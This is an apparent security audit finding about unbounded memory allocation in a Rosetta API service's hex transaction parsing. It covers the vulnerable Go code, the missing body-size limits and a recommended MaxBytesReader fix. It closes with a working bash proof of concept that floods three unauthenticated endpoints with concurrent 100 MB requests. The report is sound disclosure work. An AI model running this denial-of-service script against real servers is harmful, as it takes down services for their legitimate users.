### Title
Unbounded Memory Allocation via Oversized Hex Transaction in `unmarshallTransactionFromHexString`

### Summary
The `unmarshallTransactionFromHexString` function in `rosetta/app/services/construction_service.go` performs no input size validation before calling `hex.DecodeString` and `hiero.TransactionFromBytes`, both of which allocate memory proportional to the input size. The HTTP server applies no `http.MaxBytesReader` body size cap anywhere in the middleware stack, meaning any unauthenticated caller can submit an arbitrarily large hex-encoded blob to `/construction/hash`, `/construction/parse`, or `/construction/submit` and force unbounded heap allocation, enabling a denial-of-service.

### Finding Description
**Exact code path:**

`rosetta/app/services/construction_service.go`, lines 658–674:
```go
func unmarshallTransactionFromHexString(transactionString string) (hiero.TransactionInterface, *rTypes.Error) {
    transactionBytes, err := hex.DecodeString(tools.SafeRemoveHexPrefix(transactionString))
    if err != nil {
        return nil, errors.ErrTransactionDecodeFailed
    }
    transaction, err := hiero.TransactionFromBytes(transactionBytes)
    if err != nil {
        return nil, errors.ErrTransactionUnmarshallingFailed
    }
    ...
}
```

Called from three public endpoints (no authentication):
- `ConstructionHash` → `/construction/hash` (line 121)
- `ConstructionParse` → `/construction/parse` (line 187)
- `ConstructionSubmit` → `/construction/submit` (line 340)

**Root cause:** `hex.DecodeString` allocates a `[]byte` of exactly `len(input)/2` bytes before any validation. `hiero.TransactionFromBytes` then performs protobuf unmarshaling on that slice, potentially allocating further. Neither call has a preceding length guard.

**Why existing checks fail:**

The HTTP server in `rosetta/main.go` (lines 220–227) configures only time-based limits:
```go
httpServer := &http.Server{
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,   // default 5s
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ...
}
```

There is no `http.MaxBytesReader` applied anywhere in the middleware chain (`TracingMiddleware` → `MetricsMiddleware` → `CorsMiddleware` → router). The `Http` config struct (`rosetta/app/config/types.go`, lines 64–69) has no `MaxBodySize` field. A grep across the entire rosetta Go codebase confirms zero uses of `MaxBytesReader`, `LimitReader`, or any body-size cap.

`ReadTimeout` is a *time* limit, not a *size* limit. On a co-located or high-bandwidth connection, hundreds of megabytes can be transferred within 5 seconds. Multiple concurrent requests multiply the effect.

### Impact Explanation
An attacker sends concurrent POST requests to any of the three endpoints with a JSON body containing a multi-hundred-megabyte hex string in the `signed_transaction` field. Each request causes the process to allocate ~N/2 bytes for `hex.DecodeString` plus additional allocations inside protobuf parsing. Repeated concurrent requests exhaust the Go heap, triggering OOM termination or severe GC pressure that stalls all goroutines. This prevents all legitimate transaction submissions and block queries, constituting a complete service outage for the Rosetta API.

### Likelihood Explanation
The endpoints are unauthenticated and publicly reachable by design (Rosetta API spec). No API key, token, or privileged credential is required. The attack requires only a standard HTTP client and a fast network connection. It is trivially scriptable, repeatable, and requires no knowledge of the Hiero protocol — any attacker can send a hex string of arbitrary length. The absence of any body-size enforcement makes this a low-skill, high-impact attack.

### Recommendation
Apply `http.MaxBytesReader` at the handler or middleware level to cap request bodies to a reasonable maximum (e.g., 1 MB, well above any legitimate Hiero transaction):

```go
// In a middleware wrapping all handlers:
func MaxBodyMiddleware(next http.Handler, limit int64) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        r.Body = http.MaxBytesReader(w, r.Body, limit)
        next.ServeHTTP(w, r)
    })
}
```

Add this to the chain in `rosetta/main.go` before `CorsMiddleware`. Additionally, add an explicit string-length guard inside `unmarshallTransactionFromHexString` before calling `hex.DecodeString`:

```go
const maxTransactionHexLen = 2 * 1024 * 1024 // 1 MB decoded
if len(transactionString) > maxTransactionHexLen {
    return nil, errors.ErrTransactionDecodeFailed
}
```

### Proof of Concept
```bash
# Generate a 100 MB hex string (decodes to 50 MB allocation per request)
python3 -c "print('aa' * 50_000_000)" > /tmp/big.hex
HEX=$(cat /tmp/big.hex)

# Send 20 concurrent requests to /construction/hash
for i in $(seq 1 20); do
  curl -s -X POST http://<rosetta-host>:5700/construction/hash \
    -H 'Content-Type: application/json' \
    -d "{\"network_identifier\":{\"blockchain\":\"Hedera\",\"network\":\"testnet\"},\"signed_transaction\":\"${HEX}\"}" &
done
wait
# Observe: process RSS grows by ~1 GB; service becomes unresponsive or OOM-killed
```
